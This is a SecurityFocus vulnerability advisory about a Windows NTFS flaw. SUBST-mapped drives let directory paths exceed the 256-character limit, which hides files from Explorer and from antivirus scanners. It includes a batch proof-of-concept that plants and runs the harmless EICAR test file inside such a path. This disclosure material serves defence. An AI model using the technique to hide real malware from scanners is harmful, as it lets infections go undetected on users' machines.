source: http://www.securityfocus.com/bid/3989/info

There exists a condition in Microsoft Windows operating systems using NTFS that may allow for files to be hidden.

Though the NTFS filesystem allows for a 32000 character path, Microsoft Windows operating systems (NT4, 2000 and XP) enforce a 256 character limit. Any attempt to create, traverse or otherwise operate on a path longer than 256 chatacters will fail.

By using drives mapped to directories created with 'SUBST', it is possible to create directory paths longer than 256 characters. This can be accomplished by creating directories on the 'SUBST' drive. The directories on the drive will be subdirectories in the tree to which the drive is mapped. Creating these directories may result in the total absolute path exceeding the 256 character limit. 

If the absolute path of a directory created on a 'SUBST' mapped drive exceeds 256 characters, any files within will be inaccessible through traversing the full path. The files may still be accessed through the paths on the mapped drive. If the drive is deleted, the files may be completely inaccessible unless a drive is re-mapped to the same position in the directory tree.

This vulnerability poses a serious risk to programs which scan the filesystem, such as antivirus software. When attempting to traverse the long path, Norton Antivirus and Kaspersky Antivirus fail to scan files in the long directory trees due to the Windows path restrictions. Furthermore, if a virus executes, they do not scan the disk image because it is inaccessible. Exploitation of this vulnerability may allow for viruses to remain undetected on filesystems. Attackers may also be able to hide files using this vulnerability, as Explorer and any other utility cannot traverse the paths where they are stored.

@echo off
cls
echo Start test-script NTFS-limit
@echo Create a filepath to the limit of NTFS
md 
c:\temp\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890
\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\12345
67890\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\
123456789
cd 
c:\temp\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890
\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\12345
67890\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\
123456789
@echo Create the Eicar test-string for PoC. This should be detected normally if you 
have an active virusscanner.
echo 
X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
>EICAR.TXT
echo. >>EICAR.TXT
@echo Activate the Eicar test-string
copy EICAR.TXT EICAR1.COM >NUL
@echo Create a subst-drive Q: for this path
subst Q: 
c:\temp\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890
\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\12345
67890\1234567890\1234567890\1234567890\1234567890\1234567890\1234567890\
123456789
@echo Create e even deeper filepath (thus exceeding the limit of NTFS's explorer)
md Q:\1234567890\1234567890\1234567890
@echo Change current folder into "the deep"
Q:
cd Q:\1234567890\1234567890\1234567890
@echo Create the Eicar test-string
echo 
X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
>EICAR.TXT
echo. >>EICAR.TXT
@echo Activate the Eicar test-string
copy EICAR.TXT EICAR2.COM >NUL
EICAR2.COM
echo .
echo End of test-script